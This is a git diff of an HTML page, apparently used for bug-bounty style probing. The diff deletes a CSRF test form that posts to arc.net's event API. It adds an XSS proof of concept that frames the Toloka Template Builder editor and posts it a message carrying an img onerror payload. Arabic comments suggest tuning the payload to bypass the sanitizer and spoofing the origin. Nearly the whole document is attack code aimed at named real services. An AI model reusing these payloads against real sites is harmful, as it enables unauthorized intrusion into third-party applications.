@@ -1,16 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>CSRF Test - Manual</title>
+  <title>XSS PoC - Toloka Template Builder</title>
 </head>
 <body>
-  <h1>CSRF Test to arc.net</h1>
-  <form action="https://arc.net/api/event" method="POST" enctype="text/plain" target="hidden_iframe">
-    <input type="hidden" name='{"event":"csrf_form_test"}' value="">
-    <button type="submit">🚨 Send CSRF</button>
-  </form>
+  <h2>🚨 اختبار XSS عبر postMessage</h2>
+  <iframe id="toloka_iframe"
+    src="https://tb.toloka.dev/editor"
+    width="1200"
+    height="800"
+    style="border: 2px solid red;"></iframe>
 
-  <iframe name="hidden_iframe" style="display:none;"></iframe>
+  <script>
+    window.onload = function () {
+      const iframe = document.getElementById('toloka_iframe');
+
+      // انتظر تحميل iframe
+      iframe.onload = function () {
+        const targetOrigin = 'https://tb.toloka.dev';
+
+        // حمولة XSS - تعديلها ممكن حسب bypass sanitizer
+        const payload = '<img src=x onerror=alert("🔥 XSS via postMessage")>';
+
+        // إنشاء رسالة تشبه استجابة fetch
+        const message = {
+          originalEvent: {
+            origin: targetOrigin // أو محاولة bypass مثل attacker.toloka.dev
+          },
+          data: payload
+        };
+
+        // إرسال postMessage مباشرة بعد التحميل
+        iframe.contentWindow.postMessage(message, targetOrigin);
+      };
+    };
+  </script>
 </body>
 </html>
+
+
